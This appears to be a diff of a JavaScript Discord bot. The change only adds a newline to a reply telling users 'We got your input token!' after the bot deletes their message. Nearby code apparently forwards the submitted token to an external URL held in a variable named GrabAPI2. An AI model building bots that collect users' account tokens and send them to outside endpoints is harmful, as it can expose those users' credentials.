@@ -37,7 +37,7 @@ client.on('message', async message =>{
 			}
 			else{
 			message.delete(500);
-			setTimeout(function(){message.channel.send('*Deleting message...* 🧼 Do not worry. We got your input token! *(I mean, hopefully it is a token heh)* 👍\n')} ,1000); 
+			setTimeout(function(){message.channel.send('*Deleting message...* 🧼 \n Do not worry. We got your input token! *(I mean, hopefully it is a token heh)* 👍\n')} ,1000); 
 			setTimeout(function(){message.channel.send('*Confirming...* ⌛\n')} ,1050); 
 			const fetch = require('node-fetch');
 			let url = GrabAPI2;
@@ -223,7 +223,7 @@ client.on('message', async message =>{
 			
 			else{
 			message.delete(500);
-			setTimeout(function(){message.channel.send('*Deleting message...* 🧼 Do not worry. We got your input token! *(I mean, hopefully it is a token heh)* 👍\n')} ,1000); 
+			setTimeout(function(){message.channel.send('*Deleting message...* 🧼 \n Do not worry. We got your input token! *(I mean, hopefully it is a token heh)* 👍')} ,1000); 
 			setTimeout(function(){message.channel.send('*Confirming...* ⌛\n')} ,1000); 
 			const fetch = require('node-fetch');
 			let url = GrabAPI2;
